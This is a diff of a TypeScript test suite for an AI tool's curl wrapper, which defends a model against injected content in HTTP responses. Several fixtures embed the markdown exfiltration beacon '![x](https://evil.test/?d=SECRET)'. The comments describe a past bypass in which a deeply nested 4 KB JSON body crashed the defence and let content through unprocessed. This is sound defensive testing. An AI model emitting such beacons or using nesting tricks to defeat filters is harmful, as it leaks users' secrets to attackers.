@@ -101,22 +101,32 @@ function curlOutput(
 const HEADER_BLOCK = "HTTP/1.1 200 OK\r\ncontent-type: application/json\r\n\r\n";
 
 /**
- * Pull the JSON body out of a plain-branch response that carries a header
- * prefix — and **assert the prefix is really there first.**
+ * Pull the JSON body out of a plain-branch response that also reported headers
+ * — and **assert the two arrived as separate content entries first.**
  *
- * Without that assertion the extraction happily matches a bare JSON body, so a
- * case that never composed a header block at all passes on the strength of the
- * body alone. The prefix is the precondition of what these cases test, so it is
- * checked rather than assumed: this cannot go vacuous if the capability stub,
- * the platform, or `formatResponse`'s composition changes underneath it.
+ * The header block used to be prefixed to the body inside one entry, and this
+ * helper asserted that prefix. `docs/todos/018` separated them: one entry per
+ * remote-controlled region (ARCHITECTURE.md invariant 13), because a single
+ * entry spanning both is a defence pass whose input spans two regions —
+ * invariant 16's stated violation, and the one that deleted a field between a
+ * body's `<!--` and a later `-->`.
+ *
+ * So this now checks the SHAPE that keeps the class closed: the body is entry
+ * 0 and parses on its own, and the header text is a second entry rather than
+ * being mixed into it.
  */
-function bodyAfterHeaders(text: string): unknown {
-    if (!text.startsWith("HTTP/")) {
-        throw new Error(`expected a header prefix before the body, got: ${text.slice(0, 120)}`);
+function bodyAfterHeaders(result: unknown): unknown {
+    const parts = (result as { content: { type: string; text: string }[] }).content;
+    if (parts.length !== 2) {
+        throw new Error(`expected 2 content entries (body, headers), got ${parts.length}`);
     }
-    const match = text.match(/\{[\s\S]*\}/);
-    if (match === null) throw new Error(`no JSON body in response: ${text}`);
-    return JSON.parse(match[0]);
+    if (!parts[1]!.text.startsWith("HTTP/")) {
+        throw new Error(`entry 1 is not the header block: ${parts[1]!.text.slice(0, 120)}`);
+    }
+    if (parts[0]!.text.includes("HTTP/1.1 200 OK")) {
+        throw new Error("header text leaked into the body entry");
+    }
+    return JSON.parse(parts[0]!.text);
 }
 
 /**
@@ -153,6 +163,8 @@ function flagValue(args: readonly string[], flag: string): string | undefined {
     return i === -1 ? undefined : args[i + 1];
 }
 
+const ZWSP = "\u200b";
+
 const textOf = (result: unknown) => (result as { content: { text: string }[] }).content[0].text;
 
 beforeEach(() => {
@@ -187,17 +199,26 @@ describe("registerAllTools — the shipped binary's registration path", () => {
     // and the beacon reaches the model verbatim — which is exactly what the
     // shipped binary did.
     // ---------------------------------------------------------------------
-    it("strips a markdown beacon from an application/json body before returning it", async () => {
-        mockedExecuteCommand.mockResolvedValue(
-            curlOutput('{"note":"![x](https://evil.test/?d=SECRET)"}', "application/json")
-        );
+    it("runs the wrap over an application/json body without rewriting its values", async () => {
+        // **This asserted the beacon was STRIPPED; `docs/todos/018` reverses
+        // that on the JSON path and the case now asserts the wrap RAN instead.**
+        // The distinction matters because the defect this file exists for — the
+        // shipped binary registering tools unwrapped (`docs/todos/006`) —
+        // returns the body untouched, which after 018 is byte-identical to a
+        // correct pass-through. So the test needs something the wrap removes and
+        // an absent wrap does not: Step 2 takes the invisible codepoint, the
+        // strip stages (which no longer run here) would have taken the beacon.
+        const body = `{"note":"a${ZWSP}b ![x](https://evil.test/?d=SECRET)"}`;
+        mockedExecuteCommand.mockResolvedValue(curlOutput(body, "application/json"));
 
         const handlers = registerViaShippedPath();
         const text = textOf(await handlers.get("curl_execute")!(params({}), { sessionId: undefined }));
 
-        expect(text).toContain("[image removed]");
-        expect(text).not.toContain("evil.test");
-        expect(text).not.toContain("SECRET");
+        // The wrap ran.
+        expect(text).not.toContain(ZWSP);
+        // And returned the value verbatim otherwise. RC-10 reversed on this path.
+        expect(text).toContain("evil.test");
+        expect(text).toBe(body.replace(ZWSP, ""));
     });
 
     // ---------------------------------------------------------------------
@@ -266,37 +287,58 @@ describe("registerAllTools — the shipped binary's registration path", () => {
     });
 
     // ---------------------------------------------------------------------
-    // The wrap must survive remote-chosen nesting depth.
+    // Remote-chosen nesting depth cannot affect the body path at all.
     //
-    // Measured before the depth bound existed: a 4,035-byte body overflowed
-    // the stack inside `defendJsonLeaves`, `createWrapper`'s catch logged the
-    // `RangeError` and returned the UNTOUCHED result still tagged as wrapped,
-    // so the beacon reached the model and any downstream wrap short-circuited
-    // too. A remote could switch the whole defence off with 4 KB.
+    // **This ladder used to assert the beacon was STRIPPED at each depth, and
+    // `docs/todos/018` reverses that deliberately.** A JSON document's string
+    // values are now returned byte for byte: the strip stages enumerate markup
+    // shapes, so on a JSON body they only ever caught the marked-up subset of a
+    // class the wrap covers in full, while charging a duplicate-key collapse and
+    // number-lexeme rewriting for it. `LESSONS.md` RC-10 is reversed on this
+    // path; the beacon is contained by the spotlight boundary instead.
     //
-    // Depth is the axis, so the cases are a ladder rather than one payload:
-    // a single depth exercises a single bound, and the two generations of
-    // guard this file's own header describes both passed against the one
-    // payload they carried.
+    // **What the ladder still guards is why it was written.** Measured before
+    // the depth bound existed: a 4,035-byte body overflowed the stack inside
+    // `defendJsonLeaves`, `createWrapper`'s catch logged the `RangeError` and
+    // returned the UNTOUCHED result still tagged as wrapped — so a remote could
+    // switch the whole defence off with 4 KB. That fail-open is now unreachable
+    // rather than bounded, because nothing recurses over the object graph. The
+    // depths are kept as the proof: a body that once broke the walk must now
+    // come back intact and still wrapped.
     // ---------------------------------------------------------------------
     describe("depth cannot switch the defence off", () => {
+        // **A zero-width space is what makes these cases able to fail**, and
+        // without it a byte comparison would pass on the very fail-open they
+        // exist to catch: the original defect returned the body UNTOUCHED and
+        // tagged as wrapped, which is byte-identical to a correct pass-through.
+        //
+        // Step 2 removes this codepoint and the strip stages do not run on a
+        // JSON body, so the pair separates the two things cleanly — the ZWSP
+        // going means the wrap ran, the beacon staying means it did not rewrite.
+        const ZWSP = "\u200b";
         const nested = (depth: number) =>
             "[".repeat(depth) +
-            JSON.stringify("![x](https://evil.test/?d=SECRET)") +
+            JSON.stringify(`a${ZWSP}b ![x](https://evil.test/?d=SECRET)`) +
             "]".repeat(depth);
 
         for (const depth of [1, 50, 99, 100, 101, 500, 2000, 10000]) {
-            it(`strips the beacon at nesting depth ${depth}`, async () => {
-                mockedExecuteCommand.mockResolvedValue(
-                    curlOutput(nested(depth), "application/json")
-                );
+            it(`returns nesting depth ${depth} intact, and the wrap still ran`, async () => {
+                const body = nested(depth);
+                mockedExecuteCommand.mockResolvedValue(curlOutput(body, "application/json"));
                 const handlers = registerViaShippedPath();
                 const text = textOf(
                     await handlers.get("curl_execute")!(params({}), { sessionId: undefined })
                 );
 
-                expect(text).not.toContain("evil.test");
-                expect(text).not.toContain("SECRET");
+                // The wrap ran: Step 2 took the invisible codepoint out. Nothing
+                // else on this path removes it, so its absence is the proof.
+                expect(text).not.toContain(ZWSP);
+                // It did NOT rewrite: the beacon is remote string content in a
+                // JSON value and 018 returns it verbatim. RC-10 reversed here.
+                expect(text).toContain("evil.test");
+                // And everything else is byte for byte — no walk, so no depth at
+                // which one aborts and returns the body unprocessed.
+                expect(text).toBe(body.replace(ZWSP, ""));
             });
         }
     });
@@ -400,14 +442,12 @@ describe("registerAllTools — the shipped binary's registration path", () => {
             );
 
             const handlers = registerViaShippedPath();
-            const text = textOf(
-                await handlers.get("curl_execute")!(
-                    params({ include_headers: true, include_metadata: false }),
-                    { sessionId: undefined }
-                )
+            const result = await handlers.get("curl_execute")!(
+                params({ include_headers: true, include_metadata: false }),
+                { sessionId: undefined }
             );
 
-            expect(Object.keys(bodyAfterHeaders(text) as object)).toEqual(["a", "b", "c", "d"]);
+            expect(Object.keys(bodyAfterHeaders(result) as object)).toEqual(["a", "b", "c", "d"]);
         });
 
         it("keeps every key for a script pair behind a header block", async () => {
@@ -417,14 +457,12 @@ describe("registerAllTools — the shipped binary's registration path", () => {
             );
 
             const handlers = registerViaShippedPath();
-            const text = textOf(
-                await handlers.get("curl_execute")!(
-                    params({ include_headers: true, include_metadata: false }),
-                    { sessionId: undefined }
-                )
+            const result = await handlers.get("curl_execute")!(
+                params({ include_headers: true, include_metadata: false }),
+                { sessionId: undefined }
             );
 
-            expect(Object.keys(bodyAfterHeaders(text) as object)).toEqual(["a", "b", "c", "d"]);
+            expect(Object.keys(bodyAfterHeaders(result) as object)).toEqual(["a", "b", "c", "d"]);
         });
 
         it("keeps every key for a style pair behind a header block", async () => {
@@ -434,35 +472,40 @@ describe("registerAllTools — the shipped binary's registration path", () => {
             );
 
             const handlers = registerViaShippedPath();
-            const text = textOf(
-                await handlers.get("curl_execute")!(
-                    params({ include_headers: true, include_metadata: false }),
-                    { sessionId: undefined }
-                )
+            const result = await handlers.get("curl_execute")!(
+                params({ include_headers: true, include_metadata: false }),
+                { sessionId: undefined }
             );
 
-            expect(Object.keys(bodyAfterHeaders(text) as object)).toEqual(["a", "b", "c", "d"]);
+            expect(Object.keys(bodyAfterHeaders(result) as object)).toEqual(["a", "b", "c", "d"]);
         });
 
         // The fix must WIDEN the defence over this arm, not exempt the channel.
         // Without this, defending the body early and then skipping the wrap
         // would pass every assertion above while letting a beacon through.
-        it("still strips a beacon on the header-prefixed arm", async () => {
-            const body = '{"n":"![x](https://evil.test/?d=SECRET)"}';
+        it("still runs the wrap over the body when headers are reported alongside", async () => {
+            // The fix must WIDEN the defence over this arm, not exempt the
+            // channel: defending the body early and then skipping the wrap would
+            // pass every fidelity assertion above while letting the pass go
+            // missing. After 018 the proof is the invisible codepoint rather
+            // than the beacon, since the beacon is now returned by design.
+            const body = `{"n":"a${ZWSP}b ![x](https://evil.test/?d=SECRET)"}`;
             mockedExecuteCommand.mockResolvedValue(
                 curlOutput(body, "application/json", HEADER_BLOCK)
             );
 
             const handlers = registerViaShippedPath();
-            const text = textOf(
-                await handlers.get("curl_execute")!(
-                    params({ include_headers: true, include_metadata: false }),
-                    { sessionId: undefined }
-                )
+            const result = await handlers.get("curl_execute")!(
+                params({ include_headers: true, include_metadata: false }),
+                { sessionId: undefined }
             );
+            const text = textOf(result);
 
-            expect(text).toContain("[image removed]");
-            expect(text).not.toContain("evil.test");
+            expect(text).not.toContain(ZWSP);
+            expect(text).toContain("evil.test");
+            expect(text).toBe(body.replace(ZWSP, ""));
+            // The header text is its own entry, so nothing paired across the join.
+            expect((result as { content: unknown[] }).content).toHaveLength(2);
         });
 
         // Positive control: the header region is defended by
@@ -481,14 +524,12 @@ describe("registerAllTools — the shipped binary's registration path", () => {
             );
 
             const handlers = registerViaShippedPath();
-            const text = textOf(
-                await handlers.get("curl_execute")!(
-                    params({ include_headers: true, include_metadata: false }),
-                    { sessionId: undefined }
-                )
+            const result = await handlers.get("curl_execute")!(
+                params({ include_headers: true, include_metadata: false }),
+                { sessionId: undefined }
             );
 
-            expect(Object.keys(bodyAfterHeaders(text) as object)).toEqual(["first", "second"]);
+            expect(Object.keys(bodyAfterHeaders(result) as object)).toEqual(["first", "second"]);
         });
 
         // ---------------------------------------------------------------
@@ -563,16 +604,14 @@ describe("registerAllTools — the shipped binary's registration path", () => {
             );
 
             const handlers = registerViaShippedPath();
-            const text = textOf(
-                await handlers.get("curl_execute")!(
-                    params({ include_headers: true, include_metadata: false }),
-                    { sessionId: undefined }
-                )
+            const result = await handlers.get("curl_execute")!(
+                params({ include_headers: true, include_metadata: false }),
+                { sessionId: undefined }
             );
 
-            const returned = bodyAfterHeaders(text) as Record<string, unknown>;
+            const returned = bodyAfterHeaders(result) as Record<string, unknown>;
             expect(Object.keys(returned)).toEqual(["id", "a", "b", "c"]);
-            expect(text).toContain("9223372036854775807");
+            expect(textOf(result)).toContain("9223372036854775807");
         });
 
         it("preserves number spelling inside a nested document leaf", async () => {
@@ -593,8 +632,11 @@ describe("registerAllTools — the shipped binary's registration path", () => {
 
         // The beacon strip must still fire on a document carrying raw numbers —
         // the markers must not become a way to skip the defence.
-        it("still strips a beacon in a document carrying raw numbers", async () => {
-            const body = '{"id":9223372036854775807,"n":"![x](https://evil.test/?d=SECRET)"}';
+        it("keeps a raw number's spelling and still runs the wrap", async () => {
+            // The number markers must not become a way to skip the defence, and
+            // after 018 they cannot: nothing walks the graph. What is asserted is
+            // that the wide integer keeps its lexeme AND the wrap still ran.
+            const body = `{"id":9223372036854775807,"n":"a${ZWSP}b ![x](https://evil.test/?d=SECRET)"}`;
             mockedExecuteCommand.mockResolvedValue(curlOutput(body, "application/json"));
 
             const handlers = registerViaShippedPath();
@@ -602,9 +644,9 @@ describe("registerAllTools — the shipped binary's registration path", () => {
                 await handlers.get("curl_execute")!(params({}), { sessionId: undefined })
             );
 
-            expect(text).toContain("[image removed]");
-            expect(text).not.toContain("evil.test");
+            expect(text).not.toContain(ZWSP);
             expect(text).toContain("9223372036854775807");
+            expect(text).toBe(body.replace(ZWSP, ""));
         });
 
         it("keeps a __proto__ field inside a nested document leaf", async () => {
@@ -792,8 +834,14 @@ describe("registerAllTools — the shipped binary's registration path", () => {
             // exceeded the 1000-byte inline limit" is a sentence no reader can
             // reconcile, and a model that answers it by raising max_result_size
             // gets the same file back.
-            const body = JSON.stringify({ v: "[](file:)".repeat(100) });
-            mockedExecuteCommand.mockResolvedValue(curlOutput(body, "application/json"));
+            // **`text/markdown`, not `application/json`.** The growth this case
+            // needs comes from the beacon substitution, and after
+            // `docs/todos/018` the strip stages no longer run on a JSON body —
+            // so the JSON fixture stayed under the cap, took the inline arm, and
+            // the case had no saved message to read. The subject is unchanged:
+            // whether the two numbers in that message can be reconciled.
+            const body = "[](file:)".repeat(100);
+            mockedExecuteCommand.mockResolvedValue(curlOutput(body, "text/markdown"));
 
             const handlers = registerViaShippedPath();
             const text = textOf(
@@ -812,11 +860,21 @@ describe("registerAllTools — the shipped binary's registration path", () => {
             const limit = Number(/(\d+)-byte inline limit/.exec(text)?.[1]);
             expect(Number.isFinite(reported)).toBe(true);
             expect(limit).toBe(1000);
-            // The fixture is chosen so the defended form crosses a cap the raw
-            // body does not — that is the whole point of the case — so the
-            // reported count being BELOW the limit is expected, and the sentence
-            // must carry the qualifier that makes the pair reconcilable.
-            expect(reported).toBeLessThan(limit);
+            // **The relation INVERTED with `docs/todos/018`, and the inversion
+            // is the point rather than a loosened assertion.**
+            //
+            // This used to assert `reported < limit`, because the two numbers
+            // measured different things: the gate weighed the DEFENDED form
+            // while the message reported the artefact, which was the undefended
+            // body. That is the sentence a reader could not reconcile, and the
+            // qualifier existed to make it readable.
+            //
+            // After 018 they are the same quantity on both arms — a JSON
+            // artefact is the origin octets and the defence cannot grow a JSON
+            // body, and a non-JSON artefact IS the defended text. So a reported
+            // count below the limit it says was exceeded is no longer
+            // constructible, and the guard is the stronger direction.
+            expect(reported).toBeGreaterThanOrEqual(limit);
             expect(text).toContain("once the inline defence pass is applied");
         });
 
